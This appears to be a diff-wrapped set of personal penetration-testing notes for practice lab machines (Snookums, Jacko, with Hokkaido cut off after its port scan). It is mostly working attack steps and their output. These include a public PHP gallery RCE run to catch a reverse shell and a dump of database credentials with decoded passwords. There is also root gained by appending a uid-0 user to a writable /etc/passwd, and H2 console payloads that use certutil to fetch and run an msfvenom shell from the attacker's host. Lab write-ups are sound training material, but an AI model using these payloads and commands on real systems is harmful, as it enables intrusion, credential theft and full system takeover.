@@ -1,0 +1,1114 @@
+┌──(kali㉿kali)-[~/snookums]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.135.58           
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 08:33 CEST
+Nmap scan report for 192.168.135.58
+Host is up (0.049s latency).
+Not shown: 993 filtered tcp ports (no-response)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.234
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
+|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
+|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
+80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Simple PHP Photo Gallery
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp open  mysql       MySQL (unauthorized)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: SNOOKUMS; OS: Unix
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-07-01T06:33:35
+|_  start_date: N/A
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.4)
+|   Computer name: snookums
+|   NetBIOS computer name: SNOOKUMS\x00
+|   Domain name: \x00
+|   FQDN: snookums
+|_  System time: 2025-07-01T02:33:32-04:00
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   45.92 ms 192.168.45.1
+2   45.25 ms 192.168.45.254
+3   46.44 ms 192.168.251.1
+4   49.42 ms 192.168.135.58
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.18 seconds
+
+
+I opened port 80 on the browser and noticed that it is running a web application hosted with Simple PHP Photo Gallery v0.8
+
+I copied that to research of GitHub and found something interesting here 
+
+https://github.com/beauknowstech/SimplePHPGal-RCE.py
+
+#First time I tried the exploit it did not work because i did catch my reverse shell with an open port on the remote machine, but it finally worked when I used port 445 for my reverse shell
+
+                                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/snookums]
+└─$ python3 SimplePHPGal-RCE.py http://192.168.135.58/ 192.168.45.234 445 
+[✔] Serving HTTP traffic from /home/kali/snookums on 192.168.45.234 using port 80 in background
+Run 'nc -nlvp 445' on attacker machine in another terminal. Then press any key to continue
+Attempting to reach reverse shell on 192.168.45.234 on port 80
+192.168.135.58 - - [01/Jul/2025 09:56:14] "GET /rev.php HTTP/1.0" 200 -
+Request sent. Check your nc for a connection
+
+The Apache web directory where i first landed with the reverse shell has a file db.php which contains the information of the mysql database running internally on the machine. Through the database, I dumbed base64 encode passwords for Michael and other two users that have no session on the machine.
+
+                                                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/snookums]
+└─$ sudo rlwrap nc -lnvp 445 
+listening on [any] 445 ...
+connect to [192.168.45.234] from (UNKNOWN) [192.168.135.58] 49004
+SOCKET: Shell has connected! PID: 3426
+whoami
+apache
+hostname
+snookums
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+bash-4.2$ 
+bash-4.2$ ls
+ls
+README.txt               image.php    phpGalleryConfig.php
+UpgradeInstructions.txt  images       phpGalleryStyle-RED.css
+css                      index.php    phpGalleryStyle.css
+db.php                   js           phpGallery_images
+embeddedGallery.php      license.txt  phpGallery_thumbs
+functions.php            photos       thumbnail_generator.php
+bash-4.2$ cat db.php
+cat db.php
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+?>
+bash-4.2$ cd /
+cd /
+bash-4.2$ ls
+ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+bash-4.2$ cd home
+cd home
+bash-4.2$ ls
+ls
+michael
+bash-4.2$ cd michael
+cd michael
+bash: cd: michael: Permission denied
+bash-4.2$ mysql -u root -p
+mysql -u root -p
+Enter password: MalapropDoffUtilize1337
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 64
+Server version: 8.0.20 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show database
+show database
+    -> ;
+;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1
+mysql> sshow databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| SimplePHPGal       |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.04 sec)
+
+mysql> use SimplePHPGal
+use SimplePHPGal
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> sho tables;
+sho tables;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sho tables' at line 1
+mysql> sshow tables;
+show tables;
++------------------------+
+| Tables_in_SimplePHPGal |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from table users
+select * from table users
+    -> ;
+;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'table users' at line 1
+mysql> sselect * from users;
+select * from users;
++----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
+| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
+| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
++----------+----------------------------------------------+
+3 rows in set (0.01 sec)
+
+mysql> 
+
+These passwords had 2 times encoded passwords, I was able to decode them here (2 times also) https://www.base64decode.org/
+
+VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= MobilizeHissSeedtime747
+U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== HockSydneyCertify123
+VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ== OverallCrestLean000
+
+┌──(kali㉿kali)-[~/snookums]
+└─$ netexec ssh 192.168.135.58  --server-port 22 -u michael -p hashed_pass.txt target --continue-on-success
+SSH         192.168.135.58  22     192.168.135.58   [*] SSH-2.0-OpenSSH_7.4
+SSH         192.168.135.58  22     192.168.135.58   [-] michael:MobilizeHissSeedtime747
+SSH         192.168.135.58  22     192.168.135.58   [+] michael:HockSydneyCertify123  Linux - Shell access! 
+
+┌──(kali㉿kali)-[~/snookums]
+└─$ ssh michael@192.168.135.58
+michael@192.168.135.58's password: 
+[michael@snookums ~]$ whoami
+michael
+[michael@snookums ~]$ hostname
+snookums
+[michael@snookums ~]$ ls
+local.txt
+[michael@snookums ~]$ cat local.txt
+c50bd3433fc78fcaeb44a64286c7deb4
+[michael@snookums ~]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for michael: 
+Sorry, user michael may not run sudo on snookums.
+
+For privesc, I already tried sudo but it did not work. I resolved to transfer linpeas to the target. However, both wget and curl did not work.
+I had to use scp copy to get linpeas to the target
+
+┌──(kali㉿kali)-[~/snookums]
+└─$ scp linpeas.sh michael@192.168.135.58:/home/michael/           
+michael@192.168.135.58's password: 
+linpeas.sh                                                                                                                                                                  100%  808KB 308.7KB/s   00:02    
+
+On the target, I ran linpeas and notice that the /etc/passwd file is writable.  
+                                      
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                        
+                                                                                                                                                                                                                       
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ /etc/passwd is writable                                                                                                                                                      
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No                                                                                                                                                                           
+═╣ Can I read shadow plists? ............ No                                                                                                                                                                           
+═╣ Can I write shadow plists? ........... No                                                                                                                                                                           
+═╣ Can I read opasswd file? ............. No                                                                                                                                                                           
+═╣ Can I write in network-scripts? ...... No                                                                                                                                                                           
+═╣ Can I read root folder? .............. No 
+
+I used this guide to exploit it https://medium.com/@Fanicia/oscp-quick-hacktricks-linux-writeable-etc-passwd-cdcb9eaf2c15
+
+[michael@snookums ~]$ pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
+Warning: truncating password to 8 characters
+[michael@snookums ~]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+michael:x:1000:1000:Michael:/home/michael:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+r00t:qMeqwo4SLxUyI:0:0:root:/root:/bin/bash
+[michael@snookums ~]$ su r00t
+Password: 
+[root@snookums michael]# whoami
+root
+[root@snookums michael]# hostname
+snookums
+[root@snookums michael]# cd /root
+[root@snookums ~]# ls
+proof.txt
+[root@snookums ~]# cat proof.txt
+99e60b6a2f9af5923780699c675f89fc
+[root@snookums ~]# 
+
+
+
+#Jacko
+
+┌──(kali㉿kali)-[~/jacko]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.135.66 -p 1-65300
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 12:15 CEST
+Nmap scan report for 192.168.135.66
+Host is up (0.042s latency).
+Not shown: 65286 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: H2 Database Engine (redirect)
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8082/tcp  open  http          H2 database http console
+|_http-title: H2 Console
+9092/tcp  open  XmlIpcRegSvc?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9092-TCP:V=7.95%I=7%D=7/1%Time=6863B552%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
+SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
+SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
+SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
+SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
+SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
+SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
+SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
+SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
+SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
+SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
+SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
+SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
+SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
+SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
+SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
+SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
+SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
+SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
+SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
+SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
+SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informix
+SF:,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0t
+SF:\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\0
+SF:s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l\
+SF:0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0h
+SF:\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.\
+SF:0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\0
+SF:t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R\
+SF:0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20
+SF:\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x2
+SF:0\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\
+SF:0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x0
+SF:09\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\
+SF:0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\
+SF:0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0
+SF:\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0
+SF:\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0
+SF:n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0
+SF:b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r\
+SF:0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0
+SF:D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0
+SF:t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x2
+SF:0\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=7/1%OT=80%CT=1%CU=37812%PV=Y%DS=4%DC=T%G=Y%TM=6863B60B
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%TS=U)SEQ(SP=10
+OS:7%GCD=1%ISR=107%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=108%TI=I%CI=I%TS=U)S
+OS:EQ(SP=FD%GCD=1%ISR=103%TI=I%CI=I%TS=U)SEQ(SP=FE%GCD=1%ISR=10B%TI=I%CI=I%
+OS:TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8
+OS:NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R
+OS:=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
+OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
+OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
+OS:%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
+OS:CK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 5s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-07-01T10:18:44
+|_  start_date: N/A
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   39.52 ms 192.168.45.1
+2   39.03 ms 192.168.45.254
+3   40.89 ms 192.168.251.1
+4   41.50 ms 192.168.135.66
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 214.72 seconds
+
+Port 80 is running a web application that has a description and redirection to port 8082 which is a web SQL java console.
+
+Through the console I was able execute some SQL commands and got a reverse shell on the target using https://www.exploit-db.com/exploits/49384
+
+I copied the 3 commands as it is to the console, removing only the comments and I got a remote code execution "whoami" on the target.
+
+To get a reverse shell, I modified the last command
+
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.234/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+This transferred shell.exe to the target (shell.exe is a msfvenom generated payload)
+
+I executed it with this
+
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/jacko]
+└─$ sudo rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.234] from (UNKNOWN) [192.168.135.66] 50223
+Microsoft Windows [Version 10.0.18363.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\H2\service>whoami
+whoami
+'whoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Program Files (x86)\H2\service>cd ..
+cd ..
+
+C:\Program Files (x86)\H2>cd ..
+cd ..
+
+C:\Program Files (x86)>cd ..
+cd ..
+
+C:\>whoami
+whoami
+'whoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\>cd users
+cd users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC2F-6399
+
+ Directory of C:\Users
+
+07/01/2025  03:15 AM    <DIR>          .
+07/01/2025  03:15 AM    <DIR>          ..
+08/02/2024  12:59 PM    <DIR>          Administrator
+07/01/2025  03:15 AM    <DIR>          DefaultAppPool
+04/22/2020  04:22 AM    <DIR>          Public
+08/02/2024  12:57 PM    <DIR>          tony
+               0 File(s)              0 bytes
+               6 Dir(s)   7,198,093,312 bytes free
+
+C:\Users>cd tony
+
+
+# on a shell like this, you can move to C:\windows\system32 to execute your commands
+
+C:\Windows>cd system32
+cd system32
+
+C:\Windows\System32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+I exploited SeImpersonatePrivilege to get to get admin shell
+
+You can also use this for file transfer 
+certutil -urlcache -split -f http://192.168.45.234/PrintSpoofer.exe
+
+
+#hokkaido
+
+┌──(kali㉿kali)-[~/hokkaido]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.154.40 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 09:02 CEST
+Nmap scan report for 192.168.154.40
+Host is up (0.062s latency).
+Not shown: 65267 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-03 07:01:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Not valid before: 2023-12-07T13:54:18
+|_Not valid after:  2024-12-06T13:54:18
+|_ssl-date: 2025-07-03T07:03:17+00:00; -58s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-03T07:03:16+00:00; -58s from scanner time.
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Not valid before: 2023-12-07T13:54:18
+|_Not valid after:  2024-12-06T13:54:18
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-info: 
+|   192.168.154.40:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2025-07-03T07:03:17+00:00; -58s from scanner time.
+| ms-sql-ntlm-info: 
+|   192.168.154.40:1433: 
+|     Target_Name: HAERO
+|     NetBIOS_Domain_Name: HAERO
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: hokkaido-aerospace.com
+|     DNS_Computer_Name: dc.hokkaido-aerospace.com
+|     DNS_Tree_Name: hokkaido-aerospace.com
+|_    Product_Version: 10.0.20348
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-08-02T02:28:44
+|_Not valid after:  2054-08-02T02:28:44
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Not valid before: 2023-12-07T13:54:18
+|_Not valid after:  2024-12-06T13:54:18
+|_ssl-date: 2025-07-03T07:03:17+00:00; -58s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
+| Not valid before: 2023-12-07T13:54:18
+|_Not valid after:  2024-12-06T13:54:18
+|_ssl-date: 2025-07-03T07:03:16+00:00; -58s from scanner time.
